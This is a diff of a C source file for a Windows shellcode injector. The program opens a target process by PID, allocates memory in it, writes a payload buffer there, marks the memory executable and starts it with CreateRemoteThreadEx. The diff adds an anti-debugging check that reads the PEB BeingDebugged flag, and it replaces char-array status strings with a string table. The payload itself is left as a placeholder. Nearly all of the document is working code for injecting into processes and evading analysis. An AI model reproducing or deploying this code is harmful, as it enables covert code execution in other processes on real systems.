@@ -2,6 +2,30 @@
 #include <Windows.h>
 
 
+typedef struct _PEB {
+	BYTE                          Reserved1[2];
+	BYTE                          BeingDebugged;
+	BYTE                          Reserved2[1];
+	PVOID                         Reserved3[2];
+	PVOID                         Reserved4[3];
+	PVOID                         AtlThunkSListPtr;
+	PVOID                         Reserved5;
+	ULONG                         Reserved6;
+	PVOID                         Reserved7;
+	ULONG                         Reserved8;
+	ULONG                         AtlThunkSListPtr32;
+	PVOID                         Reserved9[45];
+	BYTE                          Reserved10[96];
+	BYTE                          Reserved11[128];
+	PVOID                         Reserved12[1];
+	ULONG                         SessionId;
+} PEB, * PPEB;
+
+const char* my_strings[17] = { "[!] PEB Read, Debugger Present\0", "[!] Access Denied\0", "[!] PID does not exist\0", "[!] Failed to get handle\0", 
+"[+] Got handle to the process\0", "[!] Failed to write memory, access denied\0", "[+] Closing handle to process\0", "[!] Failed to allocate memory\0",
+"[+] Allocating memory, base address\0", "[+] Successfully wrote data\0", "[!] Failed to write data\0", "[!] Failed to change page permissions\0",
+"[+] Changed page permissions\0", "[!] Failed to create thread\0", "[+] Killing thread\0", "[+] Create Thread\0", "[+] Thread Finished\0"};
+
 DWORD dwPID = 0;	//32 bit unsigned int 
 
 //put your data here in the 0x00,0x00 format
@@ -19,13 +43,14 @@ int do_sleep() {
 
 int main(int argc, char* argv[]) {
 
-	BOOL bDebuggerPresent;
-	if (TRUE == CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && TRUE == bDebuggerPresent) {
-		char string[] = { 'R', 'e', 'm', 'o', 't', 'e', 'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', ' ', 'D', 'e', 't', 'e', 'c', 't', 'e', 'd', '\0' };
-		printf("[!] %s", string);
+
+	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
+
+	// checking the 'BeingDebugged' element
+	if (pPeb->BeingDebugged == 1) {
+		printf("%s\n", my_strings[0]);
 		do_sleep();
 		return EXIT_FAILURE;
-
 	}
 	
 
@@ -44,27 +69,23 @@ int main(int argc, char* argv[]) {
 	if (handle == NULL) {
 		//Did the user give us a pid at a high privelege level
 		if (GetLastError() == ERROR_ACCESS_DENIED) {
-			char fail[] = { 'A','c','c','e','s','s',' ','D','e','n','i','e','d','\0' };
-			printf("[!] %s\n", (char *)fail);
+			printf("%s\n", my_strings[1]);
 			return EXIT_FAILURE;
 		}
 		//Did the user give us a pid that does not exist
 		else if (GetLastError() == ERROR_INVALID_PARAMETER) {
-			char fail[] = { 'P','I','D',' ','D','o','e','s',' ','n','o','t',' ','E','x','i','s','t','\0' };
-			printf("[!] %s\n", fail);
+			printf("%s\n", my_strings[2]);
 			return EXIT_FAILURE;
 		}
 		else {
 			//Everything went well and we got a handle to the specified process 
 			//printf("[!] Failed to GetHandle: 0x%p\n", GetLastError());
-			char no_handle[] = { 'F','a','i','l','e','d',' ','t','o',' ','G','e','t','H','a','n','d','l','e','\0' };
-			printf("[!] %s: 0x%p\n", no_handle, (void *)GetLastError());
+			printf("%s: 0x%p\n", my_strings[3], (void*)GetLastError());
 			return EXIT_FAILURE;
 		}
 	}
 
-	char get_handle[] = { 'G','o','t',' ','H','a','n','d','l','e',' ','t','o',' ','t','h','e',' ','P','r','o','c','e','s','s','\0' };
-	printf("[+] %s: 0x%p\n", get_handle, handle);
+	printf("%s: 0x%p\n", my_strings[4], handle);
 
 	LPVOID myAllocation = VirtualAllocEx(
 		handle,						//Return back a handle to this process
@@ -76,28 +97,23 @@ int main(int argc, char* argv[]) {
 	//if NULL returned something didnt work 
 	if (myAllocation == NULL) {
 		if (GetLastError() == ERROR_ACCESS_DENIED) {
-			char no_access[] = { 'F','a','i','l','e','d',' ','t','o',' ','w','r','i','t','e',' ','m','e','m','o','r','y',',',' ','A','c','c','e','s','s',' ','D','e','n','i','e','d','\0' };
-			printf("[!] %s\n", no_access);
+			printf("%s\n", my_strings[5]);
 			if (handle) {
-				char close_handle[] = { 'C','l','o','s','i','n','g',' ','H','a','n','d','l','e',' ','t','o',' ','P','r','o','c','e','s','s','\0' };
-				printf("[+] %s\n", close_handle);
+				printf("%s\n", my_strings[6]);
 				CloseHandle(handle);
 			}
 		}
 		else {
-			char no_memory[] = { 'F','a','i','l','e','d',' ','t','o',' ','a','l','l','o','c','a','t','e',' ','m','e','m','o','r','y','\0' };
-			printf("[!] %s: 0x%p\n", no_memory, (void *)GetLastError());
+			printf("%s: 0x%p\n", my_strings[7], (void*)GetLastError());
 			if (handle) {
-				char close_handle[] = { 'C','l','o','s','i','n','g',' ','H','a','n','d','l','e',' ','t','o',' ','P','r','o','c','e','s','s','\0' };
-				printf("[+] %s\n", close_handle);
+				printf("%s\n", my_strings[6]);
 				CloseHandle(handle);
 			}
 		}
 	}
 	
 	//Returns back the base address of allocated memory
-	char alloc_mem[] = { 'A','l','o','c','a','t','e','d',' ','m','e','m','o','r','y',',',' ','b','a','s','e',' ','a','d','d','r','e','s','s','\0' };
-	printf("[+] %s: 0x%p\n", alloc_mem, myAllocation);
+	printf("%s: 0x%p\n", my_strings[8], myAllocation);
 
 	//Now lets write our string to memory 
 	//handle --> the handle to the process we want to inject into 
@@ -107,12 +123,10 @@ int main(int argc, char* argv[]) {
 	//NULL --> dont care about this, can be ignored 
 	BOOL writeMemory = WriteProcessMemory(handle, myAllocation, MY_Data, szMY_Data, NULL);
 	if (writeMemory) {
-		char write_data[] = { 'S','u','c','c','e','s','s','f','u','l','l','y',' ','w','r','o','t','e',' ','d','a','t','a',' ','i','n','t','o',' ','t','a','r','g','e','t',' ','p','r','o','c','e','s','s','\0' };
-		printf("[+] %s\n", write_data);
+		printf("%s\n", my_strings[9]);
 	}
 	else {
-		char failed_write[] = { 'F','a','i','l','e','d',' ','t','o',' ','w','r','i','t','e',' ','d','a','t','a',' ','i','n','t','o',' ','t','a','r','g','e','t',' ','p','r','o','c','e','s','s',' ','m','e','m','o','r','y','\0' };
-		printf("[!] %s: 0x%p\n", failed_write, (void *)GetLastError());
+		printf("%s: 0x%p\n", my_strings[10], (void*)GetLastError());
 		return EXIT_FAILURE;
 	}
 
@@ -122,34 +136,28 @@ int main(int argc, char* argv[]) {
 	BOOL changePerms = VirtualProtectEx(handle, myAllocation, szMY_Data, PAGE_EXECUTE, &flOldProtect);
 
 	if (changePerms == 0) {
-		char failed_change[] = { 'F','a','i','l','e','d',' ','t','o',' ','c','h','a','n','g','e',' ','m','e','m','o','r','y',' ','p','e','r','m','i','s','s','i','o','n','s','\0' };
-		printf("[!] %s: 0x%p\n", failed_change, GetLastError);
+		printf("%s: 0x%p\n", my_strings[11], GetLastError);
 		return EXIT_FAILURE;
 	}
 
-	char changed[] = { 'C','h','a','n','g','e','d',' ','m','e','m','o','r','y',' ','p','e','r','m','i','s','i','o','n','s',' ','t','o',' ','R','W','X',' ',':',')','\0' };
-	printf("[+] %s\n", changed);
+	printf("%s\n", my_strings[12]);
 
 
 
 	HANDLE cThread = CreateRemoteThreadEx(handle, NULL, 0, (LPTHREAD_START_ROUTINE)myAllocation, NULL, 0, NULL, NULL);
 	if (cThread == NULL) {
-		char failed_thread[] = { 'C','o','u','l','d',' ','n','o','t',' ','c','r','e','a','t','e',' ','T','h','r','e','a','d',' ','i','n',' ','p','r','o','c','e','s','s','\0' };
-		printf("[!] %s: 0x%p\n", failed_thread, (void *)GetLastError());
+		printf("%s: 0x%p\n", my_strings[13], (void*)GetLastError());
 		if (cThread) {
-			char k_thread[] = { 'K','i','l','l','i','n','g',' ','I','n','j','e','c','t','e','d',' ','T','h','r','e','a','d','\0' };
-			printf("[+] %s\n", k_thread);
+			printf("%s\n", my_strings[14]);
 			CloseHandle(cThread);
 			return EXIT_FAILURE;
 		}
 	}
 
-	char c_thread[] = { 'C','r','e','a','t','e','d',' ','T','h','r','e','a','d',' ','i','n',' ','p','r','o','c','e','s','s',',',' ','h','a','n','d','l','e','\0' };
-	printf("[+] %s: 0x%p\n", c_thread, cThread);
+	printf("%s: 0x%p\n", my_strings[15], cThread);
 
 	WaitForSingleObject(cThread, INFINITE);
-	char t_finished[] = { 'T','h','r','e','a','d',' ','f','i','n','i','s','h','e','d',' ','e','x','e','c','u','t','i','o','n','\0' };
-	printf("[+] %s\n", t_finished);
+	printf("%s\n", my_strings[16]);
 
 
 
